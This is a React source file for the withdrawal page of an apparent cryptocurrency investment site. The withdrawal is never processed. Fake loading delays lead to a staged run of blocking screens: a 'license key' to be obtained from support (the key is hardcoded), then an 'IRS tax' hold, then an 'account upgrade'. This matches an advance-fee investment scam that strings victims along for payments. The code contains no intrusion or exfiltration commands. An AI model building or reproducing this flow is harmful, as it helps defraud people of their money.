import React from "react";

import axios from "axios";
import { useState, useEffect } from "react";
import kycimage from "../images/kyc.jpg"
import { setUserdata, clearUserdata } from "../redux/userdataSlice";
import {
  baseurl,
  setCookie,
  getCookie,
  getInvestmentDetails,
  getWithdrawableFunds,
} from "../utils/constants";
import { useSelector, useDispatch } from "react-redux";

import "../styles/DashboardWithdrawals.css";
import defaultUserImge from "../images/withdrawal.png";

export default function DashboardWithdrawals() {
  const dispatch = useDispatch();
  const userdata = useSelector((state) => state.userdata);
  const accountBalance = useSelector((state) => state.userUtils.accountBalance);
  const totalEarnings = useSelector((state) => state.userUtils.totalProfits);
  const [WithdrawableFunds, setWithdrawalableFunds] = useState(0);

  const [amountToWithdraw, setAmountToWithdraw] = useState(0);
  const [selectedWithdrwalMethod, setSelectedWithdrawalMethod] = useState("");

  const [btcAddress, setBTCAddress] = useState("");
  const [ethAddress, setETHAddress] = useState("");
  const [ltcAddress, setLTCAddress] = useState("");
  const [usdtAddress, setUSDTAddress] = useState("");
  const [error, seterror] = useState("");
  const [showLambaPage, setShowLambaPage] = useState(false);
  const [showLamba, setShowLamba] = useState(false)
  // const [btcAddress, setBTCAddress] = useState("")
  const [loadingWithdrawal, setLoadingWithdrawal] = useState(false);
  const [loadingLamba, setLoadingLamba] = useState(false);
  const currentDate = new Date().toLocaleDateString();
  const [licensecode, setlicensecode]= useState("")
   const [confirmingLicenseKey, setConfirmingLicenseKey]= useState(false);
   const[ licenseError, setLicenseError] = useState("")
  useEffect(() => {
    async function getWitdrwable() {
      let withdrawableFunds = await getWithdrawableFunds(userdata.email);
      console.log("Withdrawable funds: ", withdrawableFunds);
      setWithdrawalableFunds(withdrawableFunds);
    }

    getWitdrwable();
  }, []);


  useEffect(()=>{
    async function getuserData(){
      const loginDetails = {
        requestTask: "getLoginData",
        email: userdata.email,
      };
      const loginDetailsResult = await axios.post(baseurl, loginDetails);
      const uData = loginDetailsResult.data;
      dispatch(setUserdata(uData));
    }

    getuserData();
  },[])

  function handleChange(e) {
    setSelectedWithdrawalMethod(e.target.value);
  }

  function verifyAmount() {
    if (!amountToWithdraw) {
      seterror("Please add an amount");
      return false;
    } else if (amountToWithdraw > WithdrawableFunds) {
      seterror("Insufficient Funds.");
      return false;
    }
    return true;
  }
  const getPayToAddress = () => {
    switch (selectedWithdrwalMethod) {
      case "BTC":
        return btcAddress;
      case "ETH":
        return ethAddress;
      case "LTC":
        return ltcAddress;
      case "USDT":
        return usdtAddress;
      default:
        return "";
    }
  };
  async function confirmLicenseCode(){
      setConfirmingLicenseKey(true)
    if (licensecode=="XAAAVSDED"){
      let requestData={
        requestTask:"updateliscencecode",
        email:userdata.email,
        firstName: userdata.firstName,
      }

      let result = await axios.post(baseurl, requestData)
     

      if (result.data.trim()=="updated"){
        const loginDetails = {
          requestTask: "getLoginData",
          email: userdata.email,
        };
        const loginDetailsResult = await axios.post(baseurl, loginDetails);
        const uData = loginDetailsResult.data;
        dispatch(setUserdata(uData));
        setConfirmingLicenseKey(false)
        setShowLamba(false)
      }

     
    }
    else{
      setConfirmingLicenseKey(false)
      setLicenseError("Invalid code")
    }

   
  }
  function SwitchSelectedWithrwalMethod() {
    switch (selectedWithdrwalMethod) {
      case "BTC":
        return (
          <div className="withdrawalOption">
            <p>Insert Bitcoin Address</p>
            <input
              value={btcAddress}
              onChange={(e) => {
                setBTCAddress(e.target.value);
              }}
              type="text"
              placeholder="BTC network"
            />
            <button
              onClick={() => {
                if (!loadingWithdrawal) {
                  if (verifyAmount()) {
                    if (!btcAddress) {
                      seterror("Please add a BTC address.");
                    } else {
                      setLoadingWithdrawal(true);
                      setTimeout(() => {
                        setLoadingWithdrawal(false);
                        setShowLambaPage(true);
                      }, 3000);
                    }
                  }
                }
              }}
            >
              {loadingWithdrawal ? (
                <i class="fa-solid fa-spinner fa-spin"></i>
              ) : (
                "Proceed"
              )}
            </button>
          </div>
        );
      case "ETH":
        return (
          <div className="withdrawalOption">
            <p>Insert ETH Address</p>
            <input
              value={ethAddress}
              onChange={(e) => {
                setETHAddress(e.target.value);
              }}
              type="text"
              placeholder="ETH network"
            />

            <button
              onClick={() => {
                if (!loadingWithdrawal) {
                  if (verifyAmount()) {
                    if (!ethAddress) {
                      seterror("Please add a ETH address.");
                    } else {
                      setLoadingWithdrawal(true);
                      setTimeout(() => {
                        setLoadingWithdrawal(false);
                        setShowLambaPage(true);
                      }, 3000);
                    }
                  }
                }
              }}
            >
              {loadingWithdrawal ? (
                <i class="fa-solid fa-spinner fa-spin"></i>
              ) : (
                "Proceed"
              )}
            </button>
          </div>
        );
      case "LTC":
        return (
          <div className="withdrawalOption">
            {(e) => {
              setLTCAddress(e.target.value);
            }}
            <p>Insert LTC Address</p>
            <input type="text" placeholder="LTC network" />
            <button
              onClick={() => {
                if (!loadingWithdrawal) {
                  if (verifyAmount()) {
                    if (!ltcAddress) {
                      seterror("Please add a LTC address.");
                    } else {
                      setLoadingWithdrawal(true);
                      setTimeout(() => {
                        setLoadingWithdrawal(false);
                        setShowLambaPage(true);
                      }, 3000);
                    }
                  }
                }
              }}
            >
              {loadingWithdrawal ? (
                <i class="fa-solid fa-spinner fa-spin"></i>
              ) : (
                "Proceed"
              )}
            </button>
          </div>
        );
      case "USDT":
        return (
          <div className="withdrawalOption">
            <p>Insert USDT Address</p>
            <input
              value={usdtAddress}
              onChange={(e) => {
                setUSDTAddress(e.target.value);
              }}
              type="text"
              placeholder="TRON network"
            />

<button
              onClick={() => {
                if (!loadingWithdrawal) {
                  if (verifyAmount()) {
                    if (!usdtAddress) {
                      seterror("Please add a USDT address.");
                    } else {
                      setLoadingWithdrawal(true);
                      setTimeout(() => {
                        setLoadingWithdrawal(false);
                        setShowLambaPage(true);
                      }, 3000);
                    }
                  }
                }
              }}
            >
              {loadingWithdrawal ? (
                <i class="fa-solid fa-spinner fa-spin"></i>
              ) : (
                "Proceed"
              )}
            </button>
          </div>
        );
      case "BANK":
        return (
          <div>
            <p>Not Availble</p>
          </div>
        );
    }
  }

  function LAMBASWITCH(){
     
      if (userdata.KycStatus==0){
        return (
        <div className="lamba-container">

          <img src={kycimage} alt="kyc"/>
          <p>Please submit your KYC for verification</p>
          <button>Complete KYC</button>

        </div>)
      }

      if (userdata.KycStatus==2){
        return (
          <div className="lamba-container">
  
            {/* <img src={kycimage} alt="kyc"/> */}
            <p>Please Complete your KYC</p>
            <p> if this takes more than 24 hours, please contact support.</p>
            <button>Complete KYC</button>
  
          </div>)
      }
      if (userdata.KycStatus==1 && userdata.LicenseActivated=="FALSE" && userdata.IRSACTIVATED=="FALSE" ){
        return (
          <div className="lamba-container">
  
            <p><i class="fa-brands fa-letterboxd fa-beat"></i><br/>
              
              Hello {userdata.firstName}, <br/> Please contact customer support to license your account for withdrawal.</p>

            <input
            value={licensecode}
            onChange={(e)=>{setlicensecode(e.target.value); setLicenseError("")}}
            
            placeholder="license key"
            />
            {licenseError &&<lable style={{ color:"orangered",fontSize:"14px" }}>{licenseError}</lable>}

            <div className="dashboardbutton" onClick={()=>{
              
               confirmLicenseCode();
            }}>{confirmingLicenseKey? <i class="fa-solid fa-spinner fa-spin"></i> :"Confirm"}</div>
  
          </div>)
      }

      if (userdata.KycStatus==1 && userdata.LicenseActivated=="TRUE" && userdata.IRSACTIVATED=="FALSE" ){
        return (
          <div className="lamba-container">
  
            <p><i class="fa-brands fa-first-order-alt fa-beat-fade"></i><br/>
              
              Hello {userdata.firstName}, <br/> Your withdrawal is pending due to IRS tax.<br/><br/> Please contact customer support.
              </p>
              <button onClick={()=>{console.log(userdata)}}>Check User Data</button>
  
          </div>)
      }

      if (userdata.KycStatus==1 && userdata.LicenseActivated=="TRUE" && userdata.IRSACTIVATED=="TRUE" ){
        return (
          <div className="lamba-container">
  
            <p><i class="fa-solid fa-sliders fa-beat-fade"></i><br/>
              
              Hello {userdata.firstName}, <br/> Your withdrawal is still pending.<br/><br/> Please contact customer support for account upgrade.
              </p>
           
  
          </div>)
      }


  }

  return (
    <div className="DashboardWithdrawals">
      <div className="first-inner shortdiv" data-aos="fade-up"data-aos-duration="1500">
        <div className="user-data-continer">
          <div className="left">
            <img src={defaultUserImge} alt="" />
          </div>
          <div className="right">
            <div>
              {/* <p>{userdata.firstName}</p>
              <p>{userdata.email}</p>
              <p>Support Id: {userdata.referalcode}</p> */}
            </div>
          </div>
        </div>
        <div className="account-detail-container">
          <div className="second-inner">
            <p>Balance</p>
            <p className="amountLabel">$ {accountBalance}</p>
          </div>
          <div className="second-inner">
            <p>Widthdrawable</p>
            <p className="amountLabel">${WithdrawableFunds.toLocaleString()}</p>
          </div>
        </div>
      </div>

      {!showLambaPage ? (
        <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
          {error && <div className="form-error-container "> {error}</div>}

          <div className="first-inner shortdiv" data-aos="fade-up"data-aos-duration="1500">
            <p>Amount to Withdraw</p>
            <input
              type="number"
              value={amountToWithdraw}
              onChange={(e) => {
                setAmountToWithdraw(e.target.value);
              }}
              placeholder="$ 0"
            />
          </div>

          <div className="second-inner withdraw-method shortdiv" data-aos="fade-up"data-aos-duration="1500">
            <p>Withdrawal to</p>
            <select value={selectedWithdrwalMethod} onChange={handleChange}>
              <option value="">Select Method</option>

              <option value={"BTC"}>BTC</option>
              <option value={"ETH"}>ETH</option>
              <option value={"LTC"}>LTC</option>
              <option value={"USDT"}>USDT</option>
              <option value={"BANK"}>BANK</option>
            </select>

            {selectedWithdrwalMethod !== "" ? (
              <di>{SwitchSelectedWithrwalMethod()}</di>
            ) : (
              <></>
            )}
          </div>

        </div>
      ) : (
        <div className="first-inner" data-aos="fade-up"data-aos-duration="1500">
          {!showLamba?(
            <div className="withdrawal-details second-inner">
            <p>Widthdrawal Details</p>
            <div>
              <p>Amount: ${amountToWithdraw}</p>
              <p>Pay as: {selectedWithdrwalMethod}</p>
              <p>Pay to: {getPayToAddress()}</p>
              <p>Date: {currentDate}</p>
            </div>

            <div className="debit-container">
              <p>-$ {amountToWithdraw.toLocaleString()}</p>
            </div>

            <div style={{ display: "flex", gap: "10px" }}>
              <button
                onClick={() => {
                  setShowLambaPage(false);
                }}
              >
                Cancel
              </button>
              <button onClick={()=>{
                setLoadingLamba(true)
               setTimeout(() => {
                setWithdrawalableFunds(WithdrawableFunds - amountToWithdraw)
                setLoadingLamba(false)
                setShowLamba(true)
                console.log(userdata)
               }, 3000);
              }}>{loadingLamba ? (<i class="fa-solid fa-spinner fa-spin"></i>):"Confirm"}</button>
            </div>
          </div>
          ):(

            <div>
              <div className="withdrawal-header">
                <i class="fa-solid fa-circle-exclamation"></i>
                <p>Pending Withdrawal </p>
                </div>
              {LAMBASWITCH()}
            </div>
          )
          
        }
        </div>
      )}
    </div>
  );
}
